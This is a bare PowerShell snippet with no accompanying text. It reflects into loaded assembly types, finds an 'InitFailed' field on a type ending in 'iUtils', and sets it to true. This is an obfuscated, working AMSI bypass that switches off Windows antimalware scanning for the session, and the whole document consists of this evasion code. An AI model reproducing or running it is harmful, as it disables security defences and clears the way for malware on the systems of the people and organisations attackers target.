$a=[Ref].Assembly.GetTypes()
foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
$f.SetValue($null, $true)
